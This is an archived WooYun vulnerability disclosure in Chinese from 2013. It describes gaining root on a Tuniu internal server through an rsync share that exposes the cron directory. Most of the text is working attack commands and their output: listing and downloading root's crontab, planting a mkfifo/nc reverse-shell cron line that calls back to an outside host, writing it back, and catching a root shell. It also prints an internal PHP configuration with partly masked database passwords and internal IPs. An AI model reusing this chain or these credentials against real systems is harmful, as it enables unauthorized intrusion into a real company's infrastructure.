<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		利用某运维安全缺陷直接获得途牛内网关键业务权限（可留后门可渗透肯定不是struts）  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		利用某运维安全缺陷直接获得途牛内网关键业务权限（可留后门可渗透肯定不是struts）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/结界师">结界师</a> 
</li><li>提交时间：		2013-08-13 12:45</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-08-13：	细节已通知厂商并且等待厂商处理中<br/>
									2013-08-13：	厂商已经确认，细节仅向厂商公开<br/>
									2013-08-23：	细节向核心白帽子及相关领域专家公开<br/>
									2013-09-02：	细节向普通白帽子公开<br/>
									2013-09-12：	细节向实习白帽子公开<br/>
									2013-09-27：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">利用运维习惯缺陷加上一点点灵感可以直接获得途牛关键业务（非常关键）的系统权限，并且利用该权限可以进行内网渗透</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail"></p><pre><code>{<br />
                &quot;WyVul&quot;: [], <br />
                &quot;protocol&quot;: &quot;tcp&quot;, <br />
                &quot;state&quot;: &quot;open&quot;, <br />
                &quot;portid&quot;: &quot;873&quot;, <br />
                &quot;Service&quot;: {<br />
                    &quot;method&quot;: &quot;probed&quot;, <br />
                    &quot;srvName&quot;: &quot;rsync&quot;, <br />
                    &quot;srvProduct&quot;: &quot;&quot;, <br />
                    &quot;srvVersion&quot;: &quot;&quot;<br />
                }<br />
            }</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>rsync boss.tuniu.com::<br />
place_photo_new	<br />
hotel_photo_new	<br />
route_img_new  	<br />
pic_adv_new    	<br />
provider       	<br />
htdocs         	<br />
olv            	<br />
cron           	<br />
mnt</code></pre><p class='detail'><br />
<br />
<br />
<br />
<br />
<br />
</p><pre><code>rsync boss.tuniu.com::cron<br />
drwx------        4096 2013/08/06 21:29:10 .<br />
-rw-------           0 2013/03/11 16:42:57 apache<br />
-rw-------         214 2011/07/02 15:41:03 heming<br />
-rw-------       37776 2013/08/06 21:29:10 root<br />
-rw-------       37777 2013/08/06 16:45:22 root.bak_puppet</code></pre><p class='detail'><br />
<br />
<br />
<br />
激动么激动么，这是神马意思！！<br />
<br />
<br />
<br />
</p><pre><code>rsync boss.tuniu.com::cron/root /tmp/root<br />
cat /tmp/root<br />
# HEADER: This file was autogenerated at Wed Apr 17 17:48:00 +0800 2013 by puppet.<br />
# HEADER: While it can still be managed manually, it is definitely not recommended.<br />
# HEADER: Note particularly that the comments starting with &#039;Puppet Name&#039; should<br />
# HEADER: not be deleted, as doing so could cause duplicate cron jobs.<br />
#backup bbs<br />
#0 0 * * 0 /usr/bin/rsync -tvzrpog --progress 58.68.255.36::mnt_bbs /opt/tuniu/mnt2/bbs --bwlimit=1024<br />
<br />
0-10,30-40 * * * * (/bin/date &gt;&gt; /tmp/133.log; /bin/ps aux| /bin/sort -k 3 -nr| /usr/bin/head &gt;&gt; /tmp/133.log)<br />
*/10 * * * * (cd /opt/tuniu/www/crm/scripts/yinfulei/; /opt/tuniu/php/bin/php product_change_price_to_order_compare.php)<br />
<br />
<br />
#0 1 * * *  export dd=`/bin/date --date=&#039;today&#039; +&#039;\%d/\%b/\%Y&#039;`; /bin/grep $dd /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep &quot;GET /main.php?do=route&quot; | /bin/awk &#039;{print $2&quot; &quot;$5&quot; &quot;$7&quot; &quot;$8}&#039;&gt; /opt/tuniu/mnt/liuxiaotao.log<br />
20 23 * * * export dd=`/bin/date --date=&#039;today&#039; +&#039;\%d/\%b/\%Y&#039;`; /bin/grep &quot;$dd&quot; /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep &quot;main.php?do=route&quot; | /bin/awk &#039;{print $2&quot; &quot;$5&quot; &quot;$7&quot; &quot;$8}&#039;&gt; /opt/tuniu/mnt/liuxiaotao.log<br />
30 23 * * * export dd=`/bin/date --date=&#039;today&#039; +&#039;\%d/\%b/\%Y&#039;`; /bin/grep &quot;$dd&quot; /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep &quot;main.php?do=stock_warning&quot;| /bin/awk &#039;{print $2&quot; &quot;$5&quot; &quot;$7&quot; &quot;$8}&#039;&gt;&gt; /opt/tuniu/mnt/liuxiaotao.log<br />
40 23 * * * export dd=`/bin/date --date=&#039;today&#039; +&#039;\%d/\%b/\%Y&#039;`; /bin/grep &quot;$dd&quot; /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep &quot;main.php?do=p_ticket_clendar_show&quot;| /bin/awk &#039;{print $2&quot; &quot;$5&quot; &quot;$7&quot; &quot;$8}&#039;&gt;&gt; /opt/tuniu/mnt/liuxiaotao.log</code></pre><p class='detail'><br />
<br />
<br />
<br />
这是说这位运维把cron目录通过rsync开放了么，如果开放了写权限会如何呢？<br />
<br />
<br />
<br />
给它添加<br />
<br />
</p><pre><code>#OMS-2819<br />
*/1 * * * * ( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc *.wooyun.org 9999 &gt;/tmp/f )</code></pre><p class='detail'><br />
<br />
<br />
<br />
然后<br />
<br />
<br />
<br />
</p><pre><code>rsync /tmp/root root@boss.tuniu.com::cron/root</code></pre><p class='detail'><br />
<br />
没有任何错误，我真是个天才，坐等shell<br />
<br />
<br />
<br />
 </p><pre><code>nc -l -vv 9999<br />
Ncat: Version 6.25 ( http://nmap.org/ncat )<br />
Ncat: Listening on :::9999<br />
Ncat: Listening on 0.0.0.0:9999<br />
<br />
Ncat: Connection from 218.94.82.118.<br />
Ncat: Connection from 218.94.82.118:28542.<br />
sh: no job control in this shell<br />
sh-3.2# sh-3.2# id<br />
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)<br />
sh-3.2# uname -a<br />
Linux dl486Q13X.tuniu.org 2.6.18-194.el5PAE #1 SMP Fri Apr 2 15:37:44 EDT 2010 i686 i686 i386 GNU/Linux<br />
sh-3.2#</code></pre><p class='detail'><br />
<br />
<br />
<br />
剩下的就是......<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><p class="detail"><a href="../images/13124324cac851b577018b601270337059282036.jpg" target="_blank"><img src="../images/13124324cac851b577018b601270337059282036.jpg" alt="abcd.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><pre><code>&lt;?php<br />
//本地数据库配置信息<br />
define(&#039;DB_HOST&#039;, &#039;172.22.0.135&#039;);<br />
define(&#039;DB_PORT&#039;, &#039;3306&#039;);<br />
define(&#039;DB_USERNAME&#039;, &#039;boss&#039;);<br />
define(&#039;DB_PASSWORD&#039;, &#039;BoSS[马赛克]Niu&#039;);<br />
define(&#039;DB_SCHEMA&#039;, &#039;crm&#039;);<br />
//本地数据库只读配置信息<br />
define(&#039;DB_HOST_RO&#039;, &#039;172.22.0.171&#039;);<br />
#define(&#039;DB_HOST_RO&#039;, &#039;192.168.1.135&#039;);<br />
define(&#039;DB_PORT_RO&#039;, &#039;3306&#039;);<br />
define(&#039;DB_USERNAME_RO&#039;, &#039;boss&#039;);<br />
define(&#039;DB_PASSWORD_RO&#039;, &#039;uinut#133[马赛克]oss#March&#039;);<br />
#define(&#039;DB_PASSWORD_RO&#039;, &#039;uinut#133[马赛克]oss#March&#039;);<br />
define(&#039;DB_SCHEMA_RO&#039;, &#039;crm&#039;);<br />
//本地只写数据库配置信息<br />
define(&#039;DB_HOST_WO&#039;, &#039;172.22.0.135&#039;);<br />
define(&#039;DB_PORT_WO&#039;, &#039;3306&#039;);<br />
define(&#039;DB_USERNAME_WO&#039;, &#039;boss&#039;);<br />
define(&#039;DB_PASSWORD_WO&#039;, &#039;BoS[马赛克]Niu&#039;);<br />
define(&#039;DB_SCHEMA_WO&#039;, &#039;crm&#039;);<br />
//公网数据库<br />
#define(&#039;DB_HOST_NET&#039;, &#039;114.[马赛克].94&#039;);<br />
#define(&#039;DB_HOST_NET&#039;, &#039;58.[马赛克].42&#039;);<br />
define(&#039;DB_HOST_NET&#039;, &#039;58.[马赛克].43&#039;);<br />
define(&#039;DB_PORT_NET&#039;, &#039;3306&#039;);<br />
define(&#039;DB_USERNAME_NET&#039;, &#039;tuniu&#039;);<br />
define(&#039;DB_PASSWORD_NET&#039;, &#039;Bos[马赛克]#niU&#039;);<br />
define(&#039;DB_SCHEMA_NET&#039;, &#039;tuniu&#039;);<br />
//本地ICE配置<br />
define(&#039;ICE_NEED_USE&#039;, 1);<br />
define(&#039;ICE_HOST_ADDRESS&#039;, &#039;210.[马赛克]218&#039;);<br />
define(&#039;ICE_HOST_PORT&#039;, &#039;10000&#039;);<br />
// ---------- memcached信息 --------------- //<br />
define(&#039;MEMCACHED_HOST&#039;, &#039;172.22.0.133&#039;);<br />
define(&#039;MEMCACHED_PORT&#039;, 11211);<br />
define(&#039;MEMCACHED_FLAG&#039;, false);<br />
//define(&#039;MEMCACHED_HOST_NET&#039;, &#039;210.[马赛克].218&#039;);<br />
define(&#039;MEMCACHED_HOST_NET&#039;, &#039;60.[马赛克].121&#039;);<br />
define(&#039;MEMCACHED_PORT_NET&#039;, 11211);<br />
// --------------知识库搜索用的地址 -------------<br />
define(&#039;KNOWLEDGE_SEARCH_URL&#039;,&quot;http://172.22.0.133:8080&quot;);<br />
//---------------拉卡啦支付地址------------------<br />
define(&#039;LAKALA_HOST&#039;,&quot;http://218.[马赛克].238:8080&quot;);<br />
//---------------e家保险------------------------<br />
//define(&#039;EJIA_HOST&#039;,&quot;http://www.ejsino.cn:8080&quot;);<br />
//define(&#039;EJIA_HOST&#039;,&quot;http://203.166.160.178:8080&quot;);<br />
define(&#039;EJIA_HOST&#039;,&quot;http://www.ejsino.com:8080&quot;);<br />
<br />
//---------------ABCPDF-Server------------------------<br />
define(&#039;ABCPDF_HOST&#039;,&quot;http://192.168.1.129:80&quot;);<br />
define(&#039;ABCPDF_HOST_NET&#039;,&quot;http://222.[马赛克].142:8129&quot;);<br />
define(&#039;ABCPDF_HOST_LOCAL&#039;,&quot;http://192.168.1.129:80&quot;);<br />
define(&#039;ABCPDF_DIR&#039;,&quot;abcpdf/PDF/&quot;);<br />
define(&#039;ABCPDF_PATH&#039;,&quot;pdf&quot;);<br />
<br />
//----------------CRM-BOSS-SERVER-----------------<br />
define(&#039;CRM_HOST_IP&#039;,&quot;172.22.0.133&quot;);<br />
define(&#039;CRM_HOST_PORT&#039;,80);<br />
define(&#039;BOSS_HOST_IP&#039;,&quot;218.[马赛克].238&quot;);<br />
define(&#039;BOSS_HOST_PORT&#039;,80);<br />
<br />
//---------------FAX - SERVER ---------------------<br />
define(&#039;FAX_REC_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_BJ_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_HZ_NO&#039;,&quot;025-86853999&quot;);<br />
//define(&#039;FAX_HZ_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_SZ_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_SH_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_TJ_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_SHZ_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_CD_NO&#039;,&quot;025-86853999&quot;);<br />
define(&#039;FAX_WH_NO&#039;,&quot;025-86853999&quot;);<br />
<br />
//---------------Customer Service Hotline ------------<br />
define(&#039;PHONE_CUSTOMER_SERVICE_HOTLINE&#039;,&quot;4007-999-999&quot;);<br />
<br />
//----------------RTX - SERVER ---------------------<br />
define(&#039;RTX_HOST&#039;,&quot;192.168.1.145&quot;);<br />
define(&#039;RTX_PORT&#039;,&quot;8012&quot;);<br />
define(&#039;RTX_URI&#039;,&quot;sendnotify.cgi&quot;);<br />
define(&#039;RTX_OFFLINE&#039;,&quot;getofflineusers.php&quot;);<br />
<br />
//----------------SOLR - SERVER --------------------<br />
define(&#039;SOLR_HOST&#039;,&quot;172.22.0.133&quot;);<br />
define(&#039;SOLR_PORT&#039;,&quot;8080&quot;);<br />
define(&#039;SOLR_URI&#039;,&quot;/solr/person&quot;);<br />
<br />
//----------BOSS WEB 信息 --------------- //<br />
define(&quot;BOSS_HOST&quot;,&quot;boss.tuniu.com&quot;);<br />
define(&quot;BOSS_PORT&quot;,&quot;80&quot;);<br />
define(&quot;BOSS_USERNAME&quot;,&quot;&quot;);<br />
define(&quot;BOSS_PASSWORD&quot;,&quot;&quot;);<br />
<br />
//----------FMIS RPC 配置 --------------- //<br />
define(&quot;FMIS2_HOST&quot;,&quot;fmis2.tuniu.com&quot;);<br />
define(&quot;FMIS2_PORT&quot;,&quot;80&quot;);<br />
define(&quot;FMIS2_USERNAME&quot;,&quot;&quot;);<br />
define(&quot;FMIS2_PASSWORD&quot;,&quot;&quot;);<br />
<br />
//OA database add by miaochen 2010.07.06<br />
define(&#039;DB_HOST_OA&#039;, &#039;172.22.1.195&#039;);<br />
define(&#039;DB_PORT_OA&#039;, &#039;3306&#039;);<br />
define(&#039;DB_USERNAME_OA&#039;, &#039;TuniuOA&#039;);<br />
define(&#039;DB_PASSWORD_OA&#039;, &#039;uinut[马赛克]TuniuOA&#039;);<br />
define(&#039;DB_SCHEMA_OA&#039;, &#039;TuniuOA&#039;);<br />
define(&#039;OA_URL&#039;,&#039;oa/&#039;);//add by miaochen<br />
<br />
define(&#039;HD_URL&#039;,&#039;http://helpdesk.tuniu.com/&#039;);<br />
<br />
//TUNIU_INTERFACE_HOST<br />
define(&#039;TUNIU_INTERFACE_HOST&#039;,&#039;www.tuniu.com&#039;);<br />
define(&#039;TUNIU_INTERFACE_PORT&#039;,&#039;80&#039;);<br />
<br />
//定义财务系统绝对地址 added by jibing 2009-08-24<br />
define(&#039;FMIS_PATH&#039;,&#039;/opt/tuniu/www/FMIS/&#039;);<br />
//定义CRM系统绝对地址 added by jibing 2009-08-24<br />
<br />
define(&#039;CRM_PATH&#039;,&#039;/opt/tuniu/www/crm/&#039;);<br />
<br />
define(&#039;FMIS_SWITCH&#039;,2);<br />
<br />
//快捷航空接口信息配置<br />
define(&#039;KUAIJIEAIR_HOST&#039;,&quot;www.kuaijieair.net&quot;);<br />
define(&#039;KUAIJIEAIR_PORT&#039;,&quot;80&quot;);<br />
define(&#039;KUAIJIEAIR_URI&#039;,&quot;jipiao/port/s.php&quot;);<br />
define(&#039;KUAIJIEAIR_UID&#039;,&quot;798&quot;);<br />
<br />
//提成和统计数据<br />
define(&#039;DB_HOST_FMIS_RO&#039;, &#039;172.22.1.189&#039;);<br />
define(&#039;DB_PORT_FMIS_RO&#039;, &#039;3306&#039;);<br />
define(&#039;DB_USERNAME_FMIS_RO&#039;, &#039;[马赛克]&#039;);<br />
define(&#039;DB_PASSWORD_FMIS_RO&#039;, &#039;fb123&#039;);<br />
define(&#039;DB_SCHEMA_FMIS_RO&#039;, &#039;fmis&#039;);<br />
<br />
//呼叫中心数据库<br />
define(&#039;DB_INFOBIRD_HOST&#039;, &#039;172.[马赛克].50&#039;);<br />
define(&#039;DB_INFOBIRD_PORT&#039;, &#039;1433&#039;);<br />
define(&#039;DB_INFOBIRD_USERNAME&#039;, &#039;sa&#039;);<br />
define(&#039;DB_INFOBIRD_PASSWORD&#039;, &#039;[马赛克]&#039;);<br />
define(&#039;DB_INFOBIRD_SCHEMA&#039;, &#039;infobird&#039;);<br />
<br />
//酒店订单URL<br />
define(&#039;HOTEL_URL&#039;,&#039;http://crm.tuniu.com/hotelorder&#039;);<br />
<br />
//added by huxiaomin@20110805<br />
define(&#039;CRM_HOST&#039;,&#039;crm.tuniu.com&#039;);<br />
define(&#039;FAX_URL&#039;,&#039;http://fax.tuniu.org/&#039;);//add by huxiaomin 2011 08 11 用于传真平台的url<br />
//added by huanleG@20111108<br />
define(&#039;CRM_PORT&#039;,&#039;80&#039;);<br />
define(&#039;OA_HOST&#039;,&#039;oa.tuniu.com&#039;);</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail"> </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/结界师" title="结界师">结界师</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034232" title="利用某运维安全缺陷直接获得途牛内网关键业务权限（可留后门可渗透肯定不是struts）">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-08-13 12:48</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">问题确认，感谢@结界师</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="34232";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
